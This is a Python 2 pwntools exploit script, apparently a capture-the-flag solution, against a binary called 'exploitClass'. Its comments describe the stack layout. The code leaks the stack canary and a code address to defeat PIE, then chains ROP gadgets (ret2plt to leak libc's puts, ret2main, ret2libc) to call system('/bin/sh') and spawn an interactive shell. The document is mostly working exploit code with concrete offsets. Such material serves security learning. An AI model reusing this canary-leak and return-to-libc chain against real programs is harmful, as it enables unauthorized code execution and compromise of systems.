#!/usr/bin/env python2.7

'''
=> The exploitation is more complex by the fact that:

- The binary is compiled with the Position Independant Executable protection (We need a leak in order to do a ROP) ;
- The binary is compiled with the Stack Smash Protection (We need to take care of the canary) ;
- The binary is FULL RELRO (We can’t overwrite the GOT entry) ;
- The binary also has No eXecutable stack (We can’t execute a shellcode) ;


=> The exploitation technique is in four parts:

- Leak the canary which is the first value above our array ;
- Leak one of the .text address which is the next one after the canary. This address is the __lib_csu_init address. Using this leak we can easily - Calculate the binary base address and so on, defeat the PIE protection.
- Set again the canary value as we needed to overwrite it in order to leak the previous address.
- Overwrite the saved RIP with our gadget. I choose a basic ROP technique, ret2plt to leak the LibC, ret2main and then ret2libc.


'''

'''
## Stack view from the dissassembly of "buffer" func. 
----------------

RSP points here 		<---- (RSP)		RSP = 0x7fffffffded0 			(sub  RSP - 0x120)
array...			<---- (+0x10)		RSP + 0x10 = 0x7fffffffdee0
array...			Size of array (0x108 = 264 = [22][12])
array...				
canary-val			<---- (+0x118)		RSP + 0x118 = 0x7fffffffddb8
PUSH RBX (0x00)			<---- (+0x10) (16)	RSP = 0x7fffffffdff0
push RBP (__libc_csu_init)	<---- (+0x8)  (8) 	RSP = 0x7fffffffdff8
push r12			<---- ($rsp + 0x130)
return-add	

'''

from pwn import *

context(arch="amd64", os="linux", endian="little")


class Pwn:
	def __init__(self):
		self.p = None
		self.e = ELF("./exploitClass")
		self.libc = ELF("./libc.so.6")

	def start_binary(self):
		# self.p = remote("class.uni.hctf.fun", 24241)
		# self.p = process("./exploitClass", env={'LD_PRELOAD':'./libc.so.6'})
		self.p = process("./exploitClass")
		print util.proc.pidof(self.p)							# Print PID so we can attach the debugger.
		#sys.stdin.read(1)	
		self.p.recvuntil("exit!\n")

	def read_data(self, index):
		self.p.sendline("1")
		self.p.recvuntil("show?\n")
		self.p.sendline(str(index))
		data=self.p.recvline()
		self.p.recvuntil("exit!\n")
		return data

	def write_data(self, index, data, line):
		self.p.sendline("2")
		self.p.recvuntil("write?\n")
		self.p.sendline(str(index))
		self.p.recvuntil("write?\n")
		if line == 1:
		    self.p.sendline(data)
		else:
		    self.p.send(data)
		self.p.recvuntil("exit!\n")

	def leak_puts_from_libc(self, bin_base, leak_canary):
		# get the offset (0x14a3) using ropper.		
		pop_rdi=p64(bin_base+0x14a3)
		# Confirm using "objdump -R exploitClass | grep puts"
		puts_got=bin_base+self.e.got["puts"]
		# Confirm puts offset using "gdb> info functions (before run binary)"
		puts_plt=bin_base+self.e.plt["puts"]
		
		# Confirm main offset using "gdb> info functions (before run binary)"
		main_addr=p64(bin_base+self.e.symbols["main"])

		# Writeback canary (canary size = 8, "AAAA" was already on stack)
		self.write_data(22, p64(leak_canary), 0)
		# index[23] = "AAAA" + __libc_csu_init_off actuall address, No change.
		# index[24] + 8 points to actual return address, so control it from here.		
		# index[24] = "A" * 8 + first 4 byte of add of "pop rdi" 
		self.write_data(24, "A"*8+pop_rdi[0:4], 0)
		# index[25] = last 4 byte of "pop rdi"+full add of puts-got (as argument for puts@plt)
		self.write_data(25, pop_rdi[4:]+p64(puts_got), 0)
		
		# index[26] = add of puts@plt + first 4 byte of main
		self.write_data(26, p64(puts_plt)+main_addr[0:4], 0)

		# index[27] = only last 4 byte of main
		self.write_data(27, main_addr[4:], 0)	
		# just to close the session which will indirectly re-run the main func.
		self.p.sendline("3")
		
		# Recieve the leaked "puts" actuall address in libc.
		data=u64(self.p.recvuntil("exit!\n")[17:23]+"\x00"*2)
		return data

	def exec_system(self, libc_puts, bin_base):
		# get the offset (0x14a3) using ropper.		
		pop_rdi=p64(bin_base+0x14a3)
		
		# 0x2d010: offset of system in libc.so.6 manually calculated (gdb> p puts - p system)
		system_addr = libc_puts - 0x2d010
		# 0x10ef93 : offset of '/bin/sh' in libc from puts function.
		# 0x10ef93 : gdb> find '/bin/sh'
		# 0x10ef93 : gdb> p puts - <address of /bin/sh>
		bin_sh_addr = libc_puts + 0x10ef93

		# write the pop_rdi's first 4 byte at the return address.
		self.write_data(24, "A"*8+pop_rdi[0:4], 0)

		# write the pop_rdi's last 4 byte and address of "/bin/sh", it will work as argument for system function.
		self.write_data(25, pop_rdi[4:]+p64(bin_sh_addr), 0)

		# Write the address of system function to call it., E.g: system("/bin/sh")
		self.write_data(26, p64(system_addr), 0)

		# Exit from the binary, which will cause the return address to be called and hence shell :D
		self.p.sendline("3")
		log.info("Opening the shell for you :)")
		self.p.interactive()
		self.p.close()

	def pwn_binary(self):
		self.start_binary()

		# index[21]: Overwrite last index with all "A"s and not '\0' character, so we leak data after that index also.
		self.write_data(21, "A"*12, 0)
		# index[22]: stack canary value, Write atleast 1 A, which will overwrite null bytes of canary so we can leak canary.
		self.write_data(22, "A", 0)
		all_leak = self.read_data(21)
		leak_canary=all_leak[13:-1]
		leak_canary=u64("\x00"+leak_canary)
		log.info("Leak canary: "+hex(leak_canary))

		# Overwrite the canary value, so we can leak further.
		self.write_data(22, "A"*12, 0)
		# index[23]: address of __libc_csu_init fun + 4 byte extra, write "AAAA" so we can leak the address of "__libc_csu_init" later.
		self.write_data(23, "A"*4, 0)				

		__libc_csu_init_off = self.e.symbols["__libc_csu_init"]
		
		# leaked address of "__libc_csu_init" function.
		__libc_csu_init_address = u64(self.read_data(21)[28:-1]+"\x00"*2)

		# print "__libc_csu_init_off : ", hex(__libc_csu_init_off)
		# print "__libc_csu_init_address : ", hex(__libc_csu_init_address)

		# Calculate the base address of binary.
		bin_base=__libc_csu_init_address - __libc_csu_init_off
		log.info("Leak binary base address: "+hex(bin_base))

		
		libc_puts=self.leak_puts_from_libc(bin_base, leak_canary)

		log.info("Leak puts libc address: "+hex(libc_puts))

		self.exec_system(libc_puts, bin_base)


def main():
    pwn = Pwn()
    pwn.pwn_binary()


if __name__ == "__main__":
    main()



'''
---> To grab "__libc_csu_init" address (covers 3 entry in stack)
- index[22] = "A" * 12
- index[23] = "A" * 4

RSP points here 			<---- (RSP)		RSP = 0x7fffffffded0 			(sub  RSP - 0x120)
array...				<---- (+0x10)		RSP + 0x10 = 0x7fffffffdee0
array...				Size of array (0x108 = 264 = [22][12])
"A" * 8				
"A" * 8(canary-val)			<---- (+0x118)		RSP + 0x118 = 0x7fffffffddb8
"A" * 8 (PUSH RBX (0x00))		<---- (+0x10) (16)	RSP = 0x7fffffffdff0
push RBP (__libc_csu_init)		<---- (+0x8)  (8) 	RSP = 0x7fffffffdff8
<Address of _start func)		<---- ($rsp + 0x130)


---> To grab "__libc_csu_init" address
- index[22] = canary value + "A" * 4
- index[23] = "A" * 4

RSP points here 			<---- (RSP)		RSP = 0x7fffffffded0 			(sub  RSP - 0x120)
array...				<---- (+0x10)		RSP + 0x10 = 0x7fffffffdee0
array...				Size of array (0x108 = 264 = [22][12])
"A" * 8				
write canary-val			<---- (+0x118)		RSP + 0x118 = 0x7fffffffddb8
"AAAA"(PUSH RBX (0x00))			<---- (+0x10) (16)	RSP = 0x7fffffffdff0
push RBP (__libc_csu_init)		<---- (+0x8)  (8) 	RSP = 0x7fffffffdff8
"A" * 8 (push r12)			<---- ($rsp + 0x130)
add of pop-rdi (ret-add)
add of puts-got (argument for puts@plt)
add of puts@plt
add of main (to restart the binary)

'''
